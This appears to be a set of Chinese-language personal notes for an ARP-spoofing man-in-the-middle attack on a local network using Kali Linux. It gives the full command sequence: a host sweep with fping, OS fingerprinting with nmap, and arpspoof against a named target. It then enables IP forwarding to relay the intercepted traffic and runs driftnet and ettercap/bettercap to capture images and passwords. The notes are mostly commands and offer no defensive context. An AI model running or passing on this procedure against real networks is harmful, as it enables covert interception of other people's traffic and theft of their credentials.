### ARP域网攻击

配置动态ip

auto eth0
iface eth0 inet dhcp

重启网卡

service networking restart

##先查看本地ip 网关 网段

ip a 或 ifconfig   route -n(网关)

192.168.78.2

###获取目标IP ###

root@kali:~# fping -g 192.168.78.0/24 |grep 'alive' 

192.168.78.1 is alive
192.168.78.2 is alive （本机）  
192.168.78.151 is alive （kali ip）
192.168.78.154 is alive  （目标主机）

######

192.168.0.1 is alive
192.168.0.100 is alive
192.168.0.102 is alive
192.168.0.113 is alive
192.168.0.129 is alive 我
192.168.0.110 is alive
192.168.0.152 is alive
192.168.0.189 is alive
192.168.0.159 is alive
192.168.0.190 is alive

#####目标IP系统探测

nmap -T4 -O 192.168.78.154

#####开始arp数据劫持  （给目标主机造成断网假象）

arpspoof -i eth0 -t 192.168.78.154  192.168.78.1 

##开启ip转发（新建标签输入）

echo 1 > /proc/sys/net/ipv4/ip_forward 

cat /proc/sys/net/ipv4/ip_forward 

1

这时网络恢复正常

###开始图片嗅探：

driftnet -i eth0

driftnet ‐i eth0 172.20.10.2

 ##开始密码嗅探：

bettercap -x 

ettercap -Tq -i eth0

